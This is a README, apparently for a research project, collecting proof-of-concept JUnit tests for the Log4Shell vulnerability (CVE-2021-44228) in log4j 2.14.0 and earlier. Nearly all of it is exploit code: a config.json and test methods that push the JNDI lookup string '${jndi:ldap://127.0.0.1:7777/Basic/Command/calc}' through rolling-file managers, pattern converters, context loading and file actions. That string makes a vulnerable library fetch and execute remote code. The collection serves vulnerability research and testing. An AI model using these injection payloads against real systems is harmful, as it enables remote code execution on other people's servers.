# Poc List For log4j Library

This projects is a poc list for *log4j* java library, which extends default poc for CVE-2021-44228. Required version <= 2.14.0

## Pre-Requirements

**config.json**

```
{
  "injectedObject": {
    "injectedProperty": "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"
  }
}
```

## Pocs for FileManager Tree

**RollingFileManager.build()**

```
@Test
    public void buildRollingFileManager(){
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(OnStartupTriggeringPolicy.createPolicy(1))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        appender.getManager().rollover();
    }
```

## Pocs for Context Tree ##

**LogManager.getContext()**

```
@Test
    public void getContextPocTest(){
        URI configUri = new File("config.json").toURI();
        LoggerContext context = (LoggerContext) LogManager.getContext(null, false, configUri);
    }
```

## Pocs for Pattern Converters ##

**MessagePatternConverter.format()**

```
  @Test
    public void formatMessagePatternConverterTest() {
        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration, new String[]{"lookups"});
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        messagePatternConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
```

**PatternFormatter.format()**

```
  @Test
    public void formatPatternFormatterTest() {
        Configuration configuration = new DefaultConfiguration();
        String pattern = "%m";
        PatternParser parser = new PatternParser(configuration, "Converter", null);
        List<PatternFormatter> formatters = parser.parse(pattern);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        for (PatternFormatter formatter : formatters) {
            formatter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
        }
    }
```

**LiteralPatternConverter.format()**

```
    @Test
    public void formatLiteralPatternConverterTest() {
        Configuration configuration = new DefaultConfiguration();
        LiteralPatternConverter literalConverter = new LiteralPatternConverter(configuration, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        literalConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
```

**PatternProcessor.formatFileName()**

```
 @Test
    public void formatFileNamePatternProcessor() {
        Configuration configuration = new DefaultConfiguration();
        String pattern = "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}";
        PatternProcessor processor = new PatternProcessor(pattern);
        processor.formatFileName(configuration.getStrSubstitutor(), new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), true, null);
    }
```

## Pocs for Action Tree ##

**DeleteAction.execute()**

```
@Test
    public void executeDeleteActionTest() {
        DeleteAction action = DeleteAction.createDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false, 1, true, null , new PathCondition[]{
                IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }, null, new DefaultConfiguration());
    }
```

**PosixViewAttributeAction.execute()**
```
  @Test
    public void executePosixViewAttributeAction() throws IOException {
     PosixViewAttributeAction action = PosixViewAttributeAction.newBuilder().withPathConditions(new PathCondition[]{
            IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }).withFilePermissionsString("rwxrwxrwx").withBasePath("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").withConfiguration(new DefaultConfiguration()).build();
        action.execute();
    }
```
